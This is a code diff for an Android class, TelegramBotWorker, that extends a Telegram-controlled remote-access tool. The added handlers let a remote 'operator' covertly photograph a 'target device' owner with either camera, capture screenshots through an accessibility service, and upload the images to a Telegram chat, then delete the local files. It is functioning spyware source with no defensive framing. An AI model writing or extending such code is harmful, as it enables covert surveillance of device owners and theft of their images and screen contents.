@@ -1,13 +1,19 @@
 package com.chimera;
 
 import android.content.Context;
+import android.content.Intent;
 import org.json.JSONArray;
 import org.json.JSONObject;
+
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 
 public class TelegramBotWorker implements Runnable {
     private Context context;
@@ -20,7 +26,7 @@ public class TelegramBotWorker implements Runnable {
 
     @Override
     public void run() {
-        while (true) {
+        while (!Thread.currentThread().isInterrupted()) {
             try {
                 poll();
             } catch (Exception e) {
@@ -114,35 +120,127 @@ public class TelegramBotWorker implements Runnable {
     private void handleCallback(JSONObject cb) {
         try {
             String data = cb.getString("data");
-            String token = ConfigLoader.getBotToken();
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
-            String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
-            String msg = "Clicked: " + data;
-            String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + msg + "\"}";
-            post(urlStr, body, context);
+            String token = ConfigLoader.getBotToken();
+            String messageUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+            switch (data) {
+                case "CAM1":
+                case "CAM2":
+                    post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking picture...\"}", context);
+                    CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
+                        @Override
+                        public void onPictureTaken(String filePath) {
+                            uploadFile(filePath, chatId, data + " Picture", context);
+                        }
+                        @Override
+                        public void onError(String error) {
+                            post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Camera Error: " + error + "\"}", context);
+                        }
+                    });
+                    break;
+
+                case "SCREENSHOT":
+                    // Check if Accessibility Service is enabled first
+                    if (AutoClickerAccessibilityService.isServiceEnabled()) {
+                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking screenshot...\"}", context);
+                        Intent intent = new Intent(context, ScreenshotActivity.class);
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(intent);
+                    } else {
+                        // Inform the operator that permission is missing
+                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Screenshot failed: Accessibility Service is not enabled on the target device.\"}", context);
+                    }
+                    break;
+            }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
         }
     }
 
-    // UPDATED: Made the method static and added a Context parameter
     public static void post(String urlStr, String jsonBody, Context context) {
-        try {
-            URL url = new URL(urlStr);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestMethod("POST");
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
-            conn.setRequestProperty("Content-Type", "application/json");
-            OutputStream os = conn.getOutputStream();
-            os.write(jsonBody.getBytes("UTF-8"));
-            os.flush();
-            os.close();
-            conn.getInputStream().close();
-            conn.disconnect();
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
-        }
+        // Run on a separate thread to avoid NetworkOnMainThreadException
+        new Thread(() -> {
+            try {
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setDoOutput(true);
+                conn.setRequestMethod("POST");
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+                conn.setRequestProperty("Content-Type", "application/json");
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
+                    os.flush();
+                }
+                conn.getInputStream().close();
+                conn.disconnect();
+            } catch (Exception e) {
+                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
+            }
+        }).start();
+    }
+
+    public static void uploadFile(String filePath, long chatId, String caption, Context context) {
+        new Thread(() -> {
+            String token = ConfigLoader.getBotToken();
+            String urlStr = "https://api.telegram.org/bot" + token + "/sendPhoto";
+            String boundary = "===" + System.currentTimeMillis() + "===";
+            String LINE_FEED = "\r\n";
+
+            try {
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setDoOutput(true);
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                conn.setConnectTimeout(30000);
+                conn.setReadTimeout(30000);
+
+                File fileToUpload = new File(filePath);
+                if (!fileToUpload.exists()) return;
+
+                try (OutputStream os = conn.getOutputStream();
+                     PrintWriter writer = new PrintWriter(os, true)) {
+
+                    // Chat ID part
+                    writer.append("--").append(boundary).append(LINE_FEED);
+                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
+                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
+                    writer.append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED).flush();
+
+                    // Caption part
+                    writer.append("--").append(boundary).append(LINE_FEED);
+                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED);
+                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
+                    writer.append(LINE_FEED).append(caption).append(LINE_FEED).flush();
+
+                    // File part
+                    writer.append("--").append(boundary).append(LINE_FEED);
+                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(fileToUpload.getName()).append("\"").append(LINE_FEED);
+                    writer.append("Content-Type: image/jpeg").append(LINE_FEED);
+                    writer.append(LINE_FEED).flush();
+
+                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
+                        byte[] buffer = new byte[4096];
+                        int bytesRead;
+                        while ((bytesRead = fis.read(buffer)) != -1) {
+                            os.write(buffer, 0, bytesRead);
+                        }
+                        os.flush();
+                    }
+
+                    writer.append(LINE_FEED).flush();
+                    writer.append("--").append(boundary).append("--").append(LINE_FEED).flush();
+                }
+
+                conn.getInputStream().close();
+                conn.disconnect();
+                fileToUpload.delete(); // Clean up the file after upload
+
+            } catch (Exception e) {
+                ErrorLogger.logError(context, "TelegramBotWorker_UploadFile", e);
+            }
+        }).start();
     }
 }
